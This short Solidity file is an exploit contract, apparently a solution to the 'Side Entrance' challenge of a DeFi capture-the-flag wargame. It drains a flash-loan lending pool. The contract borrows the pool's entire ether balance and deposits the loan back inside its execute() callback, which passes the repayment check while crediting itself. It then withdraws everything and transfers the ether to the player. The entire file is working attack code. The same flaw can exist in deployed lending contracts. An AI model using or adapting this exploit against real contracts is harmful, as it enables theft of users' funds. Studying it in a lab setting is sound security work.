// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "./SideEntranceLenderPool.sol";

contract SideEntranceHack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address player;

    constructor(SideEntranceLenderPool _pool, address _player) {
        pool = _pool;
        player = _player;
    }

    function pwn() external payable {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(player).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
